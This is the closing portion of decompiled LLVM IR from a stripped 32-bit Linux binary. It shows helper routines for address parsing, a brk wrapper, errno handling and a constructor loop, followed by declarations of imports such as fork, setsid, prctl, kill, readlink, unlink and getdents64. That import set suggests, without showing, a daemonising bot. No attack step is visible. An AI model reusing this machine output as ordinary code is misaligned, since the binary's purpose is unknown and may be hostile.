  br i1 %or.cond, label %dec_label_pc_80520cd, label %dec_label_pc_80520a4

dec_label_pc_80520a4:                             ; preds = %dec_label_pc_805209b, %dec_label_pc_8052098
  %v0_805205b3 = add i32 %v0_805207e.lcssa, 1
  %v2_80520a4 = mul i32 %v0_80520a4, 256
  %v3_80520a7 = add nuw nsw i32 %v2_80520a7, 1
  %v2_80520aa = or i32 %v1_805206f.lcssa, %v2_80520a4
  %v7_80520b0 = icmp sgt i32 %v2_80520a7, 3
  br i1 %v7_80520b0, label %dec_label_pc_80520b2, label %dec_label_pc_805205b

dec_label_pc_80520b2:                             ; preds = %dec_label_pc_80520a4
  %v4_80520b7 = icmp eq i32 %arg2, 0
  br i1 %v4_80520b7, label %dec_label_pc_80520cf, label %dec_label_pc_80520be

dec_label_pc_80520be:                             ; preds = %dec_label_pc_80520b2
  %v1_80520c2 = call i32 @llvm.bswap.i32(i32 %v2_80520aa)
  %v2_80520c4 = inttoptr i32 %arg2 to i32*
  store i32 %v1_80520c2, i32* %v2_80520c4, align 4
  br label %dec_label_pc_80520cf

dec_label_pc_80520cd:                             ; preds = %dec_label_pc_805209b, %dec_label_pc_8052093, %dec_label_pc_805205b, %dec_label_pc_805206f, %dec_label_pc_8052041
  br label %dec_label_pc_80520cf

dec_label_pc_80520cf:                             ; preds = %dec_label_pc_80520b2, %dec_label_pc_80520be, %dec_label_pc_80520cd
  %v0_80520d4 = phi i32 [ 1, %dec_label_pc_80520b2 ], [ 1, %dec_label_pc_80520be ], [ 0, %dec_label_pc_80520cd ]
  ret i32 %v0_80520d4

; uselistorder directives
  uselistorder i32 %v2_8052081, { 1, 0 }
  uselistorder i32 %v6_805207f, { 1, 0 }
  uselistorder i32 %v1_805207e, { 0, 2, 1 }
  uselistorder i32 %v1_8052076, { 1, 0 }
  uselistorder i32 %v3_8052072, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_80520a7, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 %v0_805205e.pre, { 1, 0, 2 }
  uselistorder i32 256, { 1, 13, 15, 14, 2, 0, 3, 4, 5, 16, 11, 6, 7, 9, 8, 12, 10 }
  uselistorder i32 3, { 1, 2, 0, 12, 10, 13, 6, 7, 9, 3, 14, 15, 16, 17, 18, 19, 20, 11, 4, 8, 5 }
  uselistorder i32 10, { 0, 6, 5, 3, 7, 1, 12, 8, 9, 10, 11, 4, 2 }
  uselistorder i16 0, { 0, 2, 1, 5, 6, 7, 8, 3, 4 }
  uselistorder i16 8, { 1, 0 }
  uselistorder i32 -256, { 9, 0, 2, 3, 29, 5, 4, 1, 10, 11, 19, 17, 21, 25, 6, 7, 8, 12, 13, 14, 15, 16, 18, 20, 22, 23, 24, 26, 27, 28, 30 }
  uselistorder i8 0, { 23, 24, 36, 35, 20, 21, 22, 11, 13, 14, 15, 16, 17, 18, 4, 19, 12, 29, 1, 25, 30, 31, 27, 28, 32, 26, 33, 0, 34, 2, 3, 10, 5, 6, 7, 8, 9 }
  uselistorder i32 2, { 28, 33, 11, 34, 0, 53, 13, 54, 14, 26, 1, 2, 3, 29, 4, 5, 6, 15, 16, 30, 7, 8, 18, 9, 20, 17, 19, 23, 21, 22, 35, 36, 37, 38, 39, 50, 32, 42, 44, 41, 43, 45, 46, 47, 31, 40, 48, 49, 10, 27, 25, 24, 12, 51, 52 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80520cf, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80520cd, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805206f, { 1, 0 }
  uselistorder label %dec_label_pc_805205b, { 1, 0 }
}

define i32 @function_80520d5(i32 %arg1) local_unnamed_addr {
dec_label_pc_80520d5:
  %v0_80520d8 = call i32 @function_804f937()
  %v0_80520dd = load i32, i32* @edx, align 4
  %v4_80520e4 = call i32 @function_804f9c2(i32 %v0_80520d8, i32 %arg1, i32 %v0_80520dd, i32 %v0_80520dd)
  ret i32 %v4_80520e4

; uselistorder directives
  uselistorder i32* @edx, { 94, 83, 0, 2, 62, 63, 1, 8, 9, 13, 7, 90, 16, 97, 98, 104, 103, 96, 66, 76, 3, 77, 78, 79, 80, 81, 82, 67, 68, 69, 70, 71, 72, 73, 4, 74, 75, 64, 65, 10, 5, 11, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 6, 54, 55, 56, 57, 58, 59, 60, 100, 12, 14, 15, 61, 99, 93, 95, 101, 102, 84, 85, 86, 87, 88, 89, 92, 91, 105 }
}

define i32 @function_80520ed() local_unnamed_addr {
dec_label_pc_80520ed:
  %v0_80520ed = load i32, i32* @eax, align 4
  %v1_80520ed = add i32 %v0_80520ed, 28
  %v2_80520ed = inttoptr i32 %v1_80520ed to i32*
  %v3_80520ed = load i32, i32* %v2_80520ed, align 4
  store i32 %v3_80520ed, i32* @global_var_8053fb8.72, align 8
  %v1_80520f6 = add i32 %v0_80520ed, 44
  %v2_80520f6 = inttoptr i32 %v1_80520f6 to i32*
  %v3_80520f6 = load i32, i32* %v2_80520f6, align 4
  store i32 %v3_80520f6, i32* @global_var_8053fbc.73, align 4
  ret i32 %v3_80520f6

; uselistorder directives
  uselistorder i32 44, { 8, 1, 0, 5, 7, 6, 2, 3, 4 }
  uselistorder i32 28, { 22, 12, 13, 9, 10, 11, 14, 1, 2, 8, 5, 3, 0, 6, 7, 15, 4, 16, 17, 18, 19, 20, 21 }
}

define i32 @function_80520ff(i32 %arg1) local_unnamed_addr {
dec_label_pc_80520ff:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80520ff = load i32, i32* @ebx, align 4
  store i32 %v0_80520ff, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8052112 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8052112, i32* @global_var_8053a78.70, align 8
  %v7_805211d = icmp ult i32 %v1_8052112, %arg1
  %v1_805211f = icmp eq i1 %v7_805211d, false
  br i1 %v1_805211f, label %dec_label_pc_805212f, label %dec_label_pc_8052121

dec_label_pc_8052121:                             ; preds = %dec_label_pc_80520ff
  %v1_8052121 = call i32 @function_804fe1b(i32 %v0_80520ff)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8052129 = inttoptr i32 %v1_8052121 to i32*
  store i32 12, i32* %v1_8052129, align 4
  %v0_805212f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052133.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805212f

dec_label_pc_805212f:                             ; preds = %dec_label_pc_80520ff, %dec_label_pc_8052121
  %v2_8052133 = phi i32 [ %v0_80520ff, %dec_label_pc_80520ff ], [ %v2_8052133.pre, %dec_label_pc_8052121 ]
  %v0_805212f = phi i32 [ 0, %dec_label_pc_80520ff ], [ %v0_805212f.pre, %dec_label_pc_8052121 ]
  store i32 %v2_8052133, i32* @ebx, align 4
  ret i32 %v0_805212f

; uselistorder directives
  uselistorder i32 %v1_8052112, { 1, 0 }
  uselistorder i32 12, { 42, 19, 20, 14, 15, 16, 7, 51, 52, 53, 54, 55, 56, 57, 43, 44, 45, 46, 47, 48, 49, 50, 8, 9, 10, 11, 12, 13, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 5, 39, 6, 17, 18, 40, 41, 58, 61, 62, 72, 83, 73, 74, 60, 67, 63, 69, 70, 1, 66, 68, 2, 75, 59, 64, 65, 71, 76, 4, 77, 78, 80, 81, 3, 79, 82, 0 }
  uselistorder i32* @global_var_8053a78.70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805212f, { 1, 0 }
}

define i32 @function_8052135() local_unnamed_addr {
dec_label_pc_8052135:
  %v0_8052138 = load i32, i32* @eax, align 4
  %v1_805213a = sub i32 0, %v0_8052138
  %v1_805213c = call i32 @function_804fe1b(i32 ptrtoint (i32* @0 to i32))
  %v2_8052141 = inttoptr i32 %v1_805213c to i32*
  store i32 %v1_805213a, i32* %v2_8052141, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_804fe1b, { 39, 32, 43, 11, 31, 47, 42, 10, 48, 9, 5, 8, 41, 40, 38, 49, 7, 21, 6, 30, 46, 37, 36, 35, 45, 44, 34, 33, 17, 16, 15, 20, 4, 3, 29, 19, 28, 27, 26, 2, 13, 25, 24, 12, 22, 18, 1, 0, 23, 14 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 12, 13, 14, 15, 16, 17, 18, 19, 20, 7, 21, 8, 9, 10, 22, 23, 24, 25, 26, 11 }
}

define i32 @function_8052150() local_unnamed_addr {
dec_label_pc_8052150:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805215c = load i32, i32* @global_var_8053924.57, align 4
  %v10_8052161 = icmp eq i32 %v0_805215c, -1
  br i1 %v10_8052161, label %dec_label_pc_8052172, label %dec_label_pc_8052166.preheader

dec_label_pc_8052166.preheader:                   ; preds = %dec_label_pc_8052150
  br label %dec_label_pc_8052166

dec_label_pc_8052166:                             ; preds = %dec_label_pc_8052166.preheader, %dec_label_pc_8052166
  %v4_8052169 = phi i32 [ %v0_805215c, %dec_label_pc_8052166.preheader ], [ %v2_805216b, %dec_label_pc_8052166 ]
  %v0_8052166 = phi i32 [ ptrtoint (i32* @global_var_8053924.57 to i32), %dec_label_pc_8052166.preheader ], [ %v1_8052166, %dec_label_pc_8052166 ]
  %v1_8052166 = add i32 %v0_8052166, -4
  call void @__pseudo_call(i32 %v4_8052169)
  %v1_805216b = inttoptr i32 %v1_8052166 to i32*
  %v2_805216b = load i32, i32* %v1_805216b, align 4
  %v10_805216d = icmp eq i32 %v2_805216b, -1
  %v1_8052170 = icmp eq i1 %v10_805216d, false
  br i1 %v1_8052170, label %dec_label_pc_8052166, label %dec_label_pc_8052172.loopexit

dec_label_pc_8052172.loopexit:                    ; preds = %dec_label_pc_8052166
  %v2_8052172.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8052172

dec_label_pc_8052172:                             ; preds = %dec_label_pc_8052172.loopexit, %dec_label_pc_8052150
  %v2_8052172 = phi i32 [ %v2_8052172.pre, %dec_label_pc_8052172.loopexit ], [ %tmp6, %dec_label_pc_8052150 ]
  ret i32 %v2_8052172

; uselistorder directives
  uselistorder i32 %v0_805215c, { 1, 0 }
  uselistorder i1 false, { 123, 51, 70, 71, 73, 72, 0, 52, 53, 54, 34, 35, 134, 135, 136, 137, 139, 11, 140, 141, 138, 133, 124, 21, 126, 127, 128, 2, 129, 130, 131, 132, 1, 62, 63, 64, 65, 66, 67, 56, 57, 58, 59, 60, 61, 55, 22, 23, 24, 25, 26, 27, 28, 29, 30, 36, 37, 38, 39, 5, 40, 41, 10, 43, 42, 46, 44, 45, 6, 12, 47, 48, 125, 31, 3, 32, 33, 92, 93, 14, 49, 50, 68, 81, 82, 94, 4, 88, 74, 95, 96, 15, 83, 84, 16, 85, 86, 89, 17, 78, 79, 90, 97, 7, 69, 75, 8, 76, 77, 80, 87, 91, 98, 99, 18, 100, 19, 122, 101, 102, 103, 104, 105, 106, 107, 9, 108, 109, 110, 111, 112, 113, 114, 115, 121, 116, 119, 117, 118, 120, 142, 20, 13, 143 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 8, 9, 10, 11, 50, 52, 53, 54, 4, 51, 1, 49, 12, 38, 5, 39, 40, 41, 6, 0, 2, 3, 42, 43, 44, 45, 46, 47, 48, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 ptrtoint (i32* @global_var_8053924.57 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, { 22, 23, 0, 83, 161, 47, 84, 15, 48, 85, 49, 86, 50, 87, 51, 88, 52, 89, 53, 90, 54, 91, 55, 92, 56, 93, 16, 17, 6, 5, 57, 58, 94, 59, 95, 60, 96, 24, 1, 97, 46, 61, 98, 162, 8, 9, 99, 7, 100, 25, 150, 26, 101, 148, 28, 29, 18, 13, 30, 62, 31, 102, 27, 149, 3, 103, 104, 19, 20, 21, 105, 10, 12, 32, 2, 63, 146, 147, 155, 156, 64, 151, 33, 65, 106, 66, 107, 67, 108, 44, 45, 109, 68, 110, 69, 111, 70, 112, 71, 113, 72, 114, 73, 115, 74, 116, 75, 117, 76, 118, 77, 119, 78, 120, 79, 121, 80, 122, 81, 123, 34, 154, 4, 11, 124, 157, 152, 38, 125, 36, 41, 126, 42, 127, 37, 43, 128, 158, 35, 129, 130, 131, 132, 133, 153, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 39, 159, 145, 160, 14, 40, 82 }
  uselistorder i32 1, { 155, 156, 45, 99, 100, 292, 0, 293, 101, 331, 157, 5, 4, 6, 158, 18, 17, 16, 159, 7, 160, 161, 12, 163, 162, 10, 164, 8, 165, 44, 166, 68, 167, 81, 168, 82, 169, 66, 170, 90, 171, 172, 15, 14, 13, 116, 33, 174, 173, 176, 175, 52, 177, 11, 179, 178, 58, 180, 184, 183, 182, 181, 51, 332, 333, 334, 186, 185, 20, 19, 102, 187, 190, 189, 188, 60, 103, 149, 251, 117, 191, 150, 194, 193, 192, 59, 118, 287, 288, 289, 195, 32, 282, 283, 104, 284, 285, 286, 23, 21, 22, 95, 281, 119, 70, 71, 72, 73, 120, 105, 252, 253, 254, 255, 198, 197, 196, 48, 47, 46, 49, 121, 199, 34, 35, 123, 258, 259, 260, 261, 262, 263, 264, 265, 266, 122, 267, 268, 269, 270, 271, 106, 272, 273, 93, 107, 274, 275, 276, 277, 108, 109, 278, 279, 280, 202, 201, 200, 42, 38, 39, 41, 40, 110, 111, 203, 112, 113, 207, 206, 205, 204, 53, 124, 151, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 256, 257, 219, 28, 27, 26, 220, 221, 125, 126, 222, 223, 114, 225, 224, 31, 127, 226, 227, 24, 228, 25, 229, 75, 230, 9, 231, 92, 232, 74, 233, 30, 234, 29, 235, 56, 3, 237, 236, 57, 238, 54, 239, 89, 241, 240, 88, 242, 67, 243, 50, 244, 55, 43, 246, 245, 91, 306, 115, 307, 308, 96, 313, 94, 37, 36, 309, 153, 83, 84, 86, 85, 310, 154, 61, 63, 62, 65, 64, 87, 294, 295, 296, 297, 298, 299, 314, 128, 315, 138, 291, 134, 304, 144, 145, 130, 311, 140, 303, 132, 305, 316, 142, 290, 143, 139, 300, 301, 136, 302, 137, 141, 135, 133, 131, 129, 312, 317, 146, 318, 319, 330, 320, 321, 322, 323, 324, 325, 328, 147, 329, 76, 77, 80, 78, 79, 326, 327, 152, 248, 247, 69, 1, 148, 2, 97, 98, 335, 250, 249 }
  uselistorder label %dec_label_pc_8052166, { 1, 0 }
}

define i32 @function_8052176() local_unnamed_addr {
entry:
  %v0_8052179 = load i32, i32* @ebx, align 4
  %v1_805217a = call i32 @function_80480b0(i32 %v0_8052179)
  store i32 %v1_805217a, i32* @eax, align 4
  %v0_8052185 = call i32 @function_80480c0()
  ret i32 %v0_8052185

; uselistorder directives
  uselistorder i32* @eax, { 7, 16, 39, 41, 42, 43, 44, 46, 11, 47, 0, 45, 4, 6, 40, 24, 26, 27, 25, 12, 13, 17, 18, 19, 20, 22, 23, 21, 1, 14, 15, 10, 2, 28, 29, 8, 9, 30, 34, 35, 36, 31, 32, 33, 48, 37, 38, 3, 5 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 205, 31, 149, 32, 266, 267, 4, 268, 269, 270, 5, 33, 67, 68, 206, 207, 34, 198, 240, 241, 242, 78, 243, 356, 244, 187, 199, 200, 357, 185, 184, 358, 359, 360, 186, 201, 202, 208, 209, 182, 361, 296, 16, 17, 362, 369, 370, 6, 35, 150, 7, 151, 152, 380, 381, 61, 382, 36, 139, 37, 79, 80, 0, 363, 364, 365, 38, 183, 146, 368, 39, 371, 13, 140, 40, 69, 373, 376, 375, 11, 12, 253, 254, 247, 248, 249, 70, 250, 251, 252, 18, 19, 20, 21, 245, 81, 246, 82, 153, 188, 28, 189, 71, 154, 190, 210, 211, 212, 213, 214, 215, 216, 217, 218, 72, 73, 219, 155, 220, 156, 157, 83, 141, 158, 84, 142, 41, 159, 221, 222, 42, 43, 85, 143, 30, 223, 224, 225, 44, 45, 86, 144, 29, 226, 62, 227, 27, 228, 229, 231, 160, 230, 1, 374, 366, 367, 191, 192, 194, 193, 14, 15, 2, 74, 195, 196, 197, 271, 203, 204, 161, 162, 232, 233, 234, 235, 236, 237, 238, 239, 163, 255, 256, 297, 372, 257, 298, 258, 259, 260, 377, 75, 354, 261, 262, 355, 272, 299, 378, 379, 46, 47, 263, 49, 48, 50, 164, 300, 51, 165, 52, 166, 286, 167, 168, 301, 273, 274, 275, 277, 278, 351, 302, 303, 22, 169, 54, 170, 304, 305, 279, 171, 288, 172, 306, 307, 294, 295, 264, 265, 289, 290, 291, 280, 281, 282, 283, 284, 285, 287, 292, 293, 8, 64, 65, 60, 173, 53, 174, 308, 63, 309, 310, 55, 348, 349, 350, 175, 311, 312, 313, 314, 315, 316, 317, 318, 324, 147, 319, 320, 321, 322, 323, 325, 176, 177, 56, 178, 328, 329, 330, 331, 332, 76, 23, 333, 334, 335, 179, 276, 343, 344, 345, 346, 336, 337, 338, 342, 347, 24, 77, 326, 327, 57, 145, 25, 339, 340, 341, 9, 26, 148, 10, 58, 180, 3, 352, 353, 59, 181, 66, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 383, 384, 385, 386, 387, 388, 389, 390 }
  uselistorder i32* @ebx, { 12, 113, 114, 63, 64, 37, 115, 0, 116, 117, 222, 118, 15, 16, 223, 14, 224, 225, 226, 227, 228, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 65, 1, 66, 67, 68, 13, 229, 230, 181, 182, 69, 70, 231, 232, 233, 10, 11, 251, 252, 253, 254, 8, 2, 7, 236, 245, 249, 250, 234, 235, 241, 242, 119, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 122, 123, 3, 124, 125, 120, 121, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 4, 28, 29, 30, 31, 32, 33, 34, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 9, 85, 86, 87, 88, 89, 5, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 239, 240, 35, 36, 56, 57, 58, 59, 60, 61, 62, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 136, 137, 138, 139, 140, 183, 184, 237, 238, 141, 185, 186, 142, 143, 144, 243, 244, 218, 219, 145, 146, 220, 221, 150, 151, 187, 188, 246, 247, 248, 147, 152, 153, 154, 155, 156, 157, 158, 170, 171, 189, 190, 159, 160, 161, 191, 149, 165, 162, 167, 168, 169, 164, 166, 172, 173, 148, 174, 163, 175, 176, 177, 178, 179, 180, 192, 193, 194, 195, 196, 197, 198, 200, 199, 210, 211, 212, 6, 213, 201, 202, 203, 204, 205, 206, 207, 208, 209, 214, 215, 216, 217 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_5() local_unnamed_addr

declare i64 @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
